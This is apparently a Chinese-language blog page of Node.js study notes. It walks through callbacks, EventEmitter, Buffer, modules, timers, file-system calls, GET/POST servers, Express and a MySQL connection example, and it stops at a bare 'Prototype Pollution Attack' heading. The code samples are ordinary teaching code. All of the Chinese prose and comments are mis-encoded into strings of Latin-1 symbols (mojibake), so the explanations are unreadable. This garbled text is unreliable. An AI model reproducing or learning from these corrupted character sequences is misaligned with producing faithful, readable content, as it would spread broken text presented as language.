å°†æ‰§è¡Œå¼‚æ­¥æ“ä½œçš„å‡½æ•°å†™åœ¨å›è°ƒå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°ä¸­ å›è°ƒå‡½æ•°æ¥æ”¶é”™è¯¯å¯¹è±¡åˆ™ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p><p>æ‰§è¡Œ 3.js-&gt;åˆ é™¤ input.txt-&gt;æ‰§è¡Œ 3.js</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;</span>);<br></code></pre></td></tr></table></figure><p>readFile å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œå¦‚æœåœ¨è¯»å–æ–‡ä»¶è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œé”™è¯¯ err å¯¹è±¡å°±ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚<br>å¦‚æœæ²¡å‘ç”Ÿé”™è¯¯ï¼ŒreadFile è·³è¿‡ err å¯¹è±¡çš„è¾“å‡ºï¼Œæ–‡ä»¶å†…å®¹å°±é€šè¿‡å›è°ƒå‡½æ•°è¾“å‡ºï¼Œæ­¤æ—¶å°±æ˜¯ä¸€æ¬¡å¼‚æ­¥æ“ä½œã€‚</p><h2 id="å…­ã€EventEmitter"><a href="#å…­ã€EventEmitter" class="headerlink" title="å…­ã€EventEmitter"></a>å…­ã€EventEmitter</h2><p>events æ¨¡å—åªæä¾› events.EventEmitter,å®ƒæ˜¯äº‹ä»¶è§¦å‘å’Œäº‹ä»¶ç›‘å¬çš„å°è£… EventEmitter å¯¹è±¡ä¸­æœ‰å¤šä¸ªå±æ€§ on ç»‘å®šäº‹ä»¶å‡½æ•° emit å±æ€§è§¦å‘äº‹ä»¶</p><p>event.js EventEmitter ç”¨æ³•</p><p>event1.js ä½“ç°å¦‚ä¸‹</p><p>EventEmitter çš„æ¯ä¸ªäº‹ä»¶ç”±ä¸€ä¸ªäº‹ä»¶åå’Œè‹¥å¹²ä¸ªå‚æ•°ç»„æˆï¼Œäº‹ä»¶åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸è¡¨è¾¾ä¸€å®šçš„è¯­ä¹‰ã€‚å¯¹äºæ¯ä¸ªäº‹ä»¶ï¼ŒEventEmitter æ”¯æŒ è‹¥å¹²ä¸ªäº‹ä»¶ç›‘å¬å™¨ã€‚</p><p>å½“äº‹ä»¶è§¦å‘æ—¶ï¼Œæ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶çš„äº‹ä»¶ç›‘å¬å™¨è¢«ä¾æ¬¡è°ƒç”¨ï¼Œäº‹ä»¶å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°å‚æ•°ä¼ é€’ã€‚</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/EventEmitter.png"></p><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>event å®ä¾‹.js äº†è§£å…¶ä»–å±æ€§æ–¹æ³•â€¦</p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿé”™è¯¯æ—¶æ²¡æœ‰ç›‘å¬å™¨æ—¶ä¼šæŠ¥é”™ ä¸€èˆ¬è¦å¯¹å…¶è®¾ç½® error äº‹ä»¶çš„ç›‘å¬å™¨</p><h2 id="ä¸ƒã€Buffer"><a href="#ä¸ƒã€Buffer" class="headerlink" title="ä¸ƒã€Buffer"></a>ä¸ƒã€Buffer</h2><p>JavaScript è¯­è¨€è‡ªèº«åªæœ‰å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æ•°æ®ç±»å‹ã€‚</p><p>ä½†åœ¨å¤„ç†åƒ TCP æµæˆ–æ–‡ä»¶æµæ—¶ï¼Œå¿…é¡»ä½¿ç”¨åˆ°äºŒè¿›åˆ¶æ•°æ®ã€‚å› æ­¤åœ¨ Node.js ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ª Buffer ç±»ï¼Œè¯¥ç±»ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å­˜åŒºã€‚</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// è¾“å‡º 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// è¾“å‡º cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><p>ç›®å‰æ”¯æŒçš„å­—ç¬¦ç¼–ç  asciiã€utf8ã€utf16leã€ucs2 - utf16leã€base64ã€latin1ã€binary - latin1ã€hex</p><p>å†™å…¥ç¼“å†²åŒº</p><blockquote><p>buf.write(string[, offset[, length]][, encoding])</p></blockquote><p>ä»ç¼“å†²åŒºè¯»å–</p><blockquote><p>buf.toString([encoding[, start[, end]]])</p></blockquote><p>å°† buffer è½¬æ¢ä¸º json å¯¹è±¡</p><blockquote><p>buf.toJSON()</p></blockquote><p>åˆå¹¶ç¼“å†²åŒº</p><blockquote><p>Buffer.concat(list[, totalLength])</p></blockquote><p>æ¯”è¾ƒç¼“å†²åŒº</p><blockquote><p>buf.compare(otherBuffer);</p></blockquote><p>æ‹·è´ç¼“å†²åŒº</p><blockquote><p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p></blockquote><p>è£å‰ªç¼“å†²åŒº</p><blockquote><p>buf.slice([start[, end]])</p></blockquote><p>è®¡ç®—ç¼“å†²åŒºé•¿åº¦</p><blockquote><p>buf.length;</p></blockquote><h2 id="å…«ã€æ¨¡å—ç³»ç»Ÿ"><a href="#å…«ã€æ¨¡å—ç³»ç»Ÿ" class="headerlink" title="å…«ã€æ¨¡å—ç³»ç»Ÿ"></a>å…«ã€æ¨¡å—ç³»ç»Ÿ</h2><p>å‰é¢ä»‹ç»è¿‡äº† å¼•å…¥æ¨¡å—ä½¿ç”¨ require+æ¨¡å—æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/require.jpg"><br>require æ¥æ”¶ httpã€fs ç­‰åŸç”Ÿæ¨¡å—ä»¥åŠæŸè·¯å¾„ä¸‹çš„æ–‡ä»¶æ¨¡å—ï¼Œè¿˜æœ‰ mod éåŸç”Ÿæ¨¡å—</p><p>æ³¨æ„ï¼šrequire()ä¸æ˜¯å…¨å±€çš„ï¼</p><h2 id="ä¹ã€å‡½æ•°"><a href="#ä¹ã€å‡½æ•°" class="headerlink" title="ä¹ã€å‡½æ•°"></a>ä¹ã€å‡½æ•°</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p>say æ˜¯ä¸€ä¸ªå‡½æ•° execute å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ say æœ¬èº«(ä¸æ˜¯å®ƒçš„è¿”å›å€¼) è€Œ say ä¸­æœ‰ä¸€ä¸ªå‚æ•° æ‰€ä»¥ç”¨æœ¬åœ°å˜é‡ someFunction æ¥ä¼ é€’å˜é‡</p><ul><li>åŒ¿åå‡½æ•°<br>ä¸€èˆ¬æˆ‘ä»¬å‡½æ•°ä½¿ç”¨æ˜¯å…ˆå£°æ˜åå®šä¹‰ä½¿ç”¨<br>å³ä½¿æˆ‘ä»¬ä¸æ€¥ç€å®šä¹‰å‡½æ•°ä½“ ä½†åœ¨å¯¹åº”åŸŸå‰å¿…é¡»å£°æ˜äº† æˆ‘ä»¬æ‰èƒ½è°ƒç”¨ è€Œè¿™æˆ‘ä»¬å¯åœ¨å‡½æ•°ä½“å†…â€”â€”åœ¨å‚æ•°è¡¨ä¸­ä½¿ç”¨æœ¬åœ°å˜é‡ someFunction åœ¨å‡½æ•°ä½“å†…ç›´æ¥ä½¿ç”¨ ç”šè‡³éƒ½ä¸ç”¨ç»™å‡½æ•°åå­—</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="åã€è·¯ç”±"><a href="#åã€è·¯ç”±" class="headerlink" title="åã€è·¯ç”±"></a>åã€è·¯ç”±</h2><p>url è¯·æ±‚ GET POST å‚æ•°åœ¨å‰é¢æ­å»ºç®€å•åº”ç”¨æ—¶æ²¡æœ‰æåŠ ä½œä¸ºåç«¯å¤„ç†è¿™äº›è¯·æ±‚å°±è¦æœ‰ç›¸åº”çš„æœåŠ¡å™¨çš„åŠŸèƒ½<br>router ä¸‹æœ‰ä¸ª index.js æ–‡ä»¶ é‡Œé¢å¯ä»¥è®¾ç½®æ•°æ®åº“ å¼•å…¥å…¶ä»–æ¨¡å— åŒæ ·å¯ä»¥å†™ä¸€ä¸ªæœåŠ¡çš„ serve.js å¼•å…¥ http url ç­‰æ¨¡å— å¯åŠ¨åå……å½“æœåŠ¡å™¨<br>ç„¶åç”¨åˆ°ä¸€ä¸ª router.js çš„æ–‡ä»¶ å†™ä¸€ä¸ªè·¯ç”±å‡½æ•°ä½œä¸ºå‚æ•°ä¼ ç»™ server.js<br>è‡³æ­¤å¯ä»¥è®¿é—® url</p><h2 id="åä¸€ã€å…¨å±€å˜é‡"><a href="#åä¸€ã€å…¨å±€å˜é‡" class="headerlink" title="åä¸€ã€å…¨å±€å˜é‡"></a>åä¸€ã€å…¨å±€å˜é‡</h2><p>åˆ—å‡ºä¸€ä¸¢ä¸¢ï¼š</p><p>_filename å½“å‰è„šæœ¬æ–‡ä»¶å è¾“å‡ºå…¶ç»å¯¹è·¯å¾„</p><p>_dirname å½“å‰è„šæœ¬æ‰€åœ¨è·¯å¾„</p><p>setTimeout(function(),ms) å…¨å±€å‡½æ•° åœ¨æŒ‡å®šæ¯«ç§’åæ‰§è¡Œä¸€æ¬¡å‡½æ•°</p><p>clearTimeout(t) æ¸…é™¤ setTimeout()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// ä¸¤ç§’åæ‰§è¡Œä»¥ä¸Šå‡½æ•°</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// æ¸…é™¤å®šæ—¶å™¨</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure><p>setlnterval(function(),ms)<br>clearlnterval(t)<br>å’Œä¸Šé¢çš„ä¸¤ä¸ªä¸€æ · ä¸åŒçš„æ˜¯ setlntercal ä¼šä¸€ç›´è°ƒç”¨å‡½æ•° ç›´è‡³ clearlnterval è°ƒç”¨æˆ–çª—å£å…³é—­</p><p>process æ˜¯ global çš„å±æ€§ ä¹Ÿæ˜¯å…¨å±€å˜é‡æœ‰å››ä¸ªäº‹ä»¶<br>exit before uncaughException Signal</p><h2 id="åäºŒã€æ–‡ä»¶-å¼‚æ­¥"><a href="#åäºŒã€æ–‡ä»¶-å¼‚æ­¥" class="headerlink" title="åäºŒã€æ–‡ä»¶-å¼‚æ­¥"></a>åäºŒã€æ–‡ä»¶-å¼‚æ­¥</h2><p>å¯¼å…¥æ–‡ä»¶ç³»ç»Ÿæ¨¡å—<br><code>var fs = require(&quot;fs&quot;)</code></p><ul><li>è¯»å– input.txt</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;å¼‚æ­¥è¯»å–: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°æœ‰å‡½æ•°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ‰“å¼€<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>å†™å…¥<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>è¯»å–<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>å…³é—­<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>åˆ é™¤<br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>è¿˜æœ‰ç›®å½•...<br></code></pre></td></tr></table></figure><h2 id="åä¸‰ã€GET-POST-è¯·æ±‚"><a href="#åä¸‰ã€GET-POST-è¯·æ±‚" class="headerlink" title="åä¸‰ã€GET/POST è¯·æ±‚"></a>åä¸‰ã€GET/POST è¯·æ±‚</h2><p>è·å– get è¯·æ±‚çš„å‚æ•°</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>è·å– url çš„å‚æ•°</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br><br>    <span class="hljs-comment">// è§£æ url å‚æ•°</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;ç½‘ç«™åï¼š&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;ç½‘ç«™ URLï¼š&quot;</span> + params.url);<br>    res.end();<br><br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>è·å– post çš„å†…å®¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// å®šä¹‰äº†ä¸€ä¸ªpostå˜é‡ï¼Œç”¨äºæš‚å­˜è¯·æ±‚ä½“çš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// é€šè¿‡reqçš„dataäº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œæ¯å½“æ¥å—åˆ°è¯·æ±‚ä½“çš„æ•°æ®ï¼Œå°±ç´¯åŠ åˆ°postå˜é‡ä¸­</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;<br>        post += chunk;<br>    &#125;);<br><br>    <span class="hljs-comment">// åœ¨endäº‹ä»¶è§¦å‘åï¼Œé€šè¿‡querystring.parseå°†postè§£æä¸ºçœŸæ­£çš„POSTè¯·æ±‚æ ¼å¼ï¼Œç„¶åå‘å®¢æˆ·ç«¯è¿”å›ã€‚</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>æäº¤ post è¡¨å•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><br><span class="hljs-keyword">var</span> postHTML =<br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js å®ä¾‹&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;ç½‘ç«™åï¼š &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;ç½‘ç«™ URLï¼š &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// è§£æå‚æ•°</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// è®¾ç½®å“åº”å¤´éƒ¨ä¿¡æ¯åŠç¼–ç </span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br><br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// è¾“å‡ºæäº¤çš„æ•°æ®</span><br>        res.write(<span class="hljs-string">&quot;ç½‘ç«™åï¼š&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;ç½‘ç«™ URLï¼š&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// è¾“å‡ºè¡¨å•</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><h2 id="åå››ã€Express-æ¡†æ¶"><a href="#åå››ã€Express-æ¡†æ¶" class="headerlink" title="åå››ã€Express æ¡†æ¶"></a>åå››ã€Express æ¡†æ¶</h2><p>åˆ©ç”¨ Express æ¡†æ¶<br>å®ç° GEt æ–¹æ³•æäº¤ä¸¤ä¸ªå‚æ•°å’Œ POST æ–¹æ³•æäº¤ä¸¤ä¸ªå‚æ•°<br>å®Œæˆæ–‡ä»¶ä¸Šä¼  è¦æœ¬åœ°å®‰è£… multer æ¨¡å— åœ¨ç›®å½•ä¸‹èƒ½çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶<br>å¯¹ cookie è¿›è¡Œç®¡ç† è¦æœ¬åœ°å®‰è£… cookie-parser æ¨¡å— åœ¨æœåŠ¡ç»ˆç«¯èƒ½çœ‹åˆ° cookie ä¿¡æ¯</p><h2 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h2><p>ä»¥ mysql ä¸ºä¾‹<br>åœ¨ä¸€é¡¹ç›®ä¸­ test.js æ–‡ä»¶æ˜¯ nodejs ä¸ mysql çš„é…ç½®ä¿¡æ¯</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br><br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸè¿æ¥æ•°æ®åº“çš„è¯ è¾“å‡º 2</p><p>å¯ä»¥åœ¨å…¶ä»– js ä¸­æŸ¥è¯¢æ•°æ®åº“çš„ä¿¡æ¯<br>ä»¥æŸ¥ä¸€ä¸ªè¡¨ä¸ºä¾‹ æ•°æ®åº“å¯ä»¥è‡ªè¡Œåˆ›å»º</p><p>å¯åŠ¨æ•°æ®åº“ æŸ¥ä¸€ä¸‹<br>ç„¶åç”¨ sql.js æŸ¥ä¸€ä¸‹ æ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹<br>é‡Œé¢çš„ sql=â€™æŸ¥è¯¢è¯­å¥â€™å°±å¯ä»¥è¿›è¡Œæ•°æ®åº“æ“ä½œäº†</p><p>é¡¹ç›®</p><p>ä¹Ÿå¯ä»¥ nodejs å®‰è£… MongoDB æ¥å¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œ</p><h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution 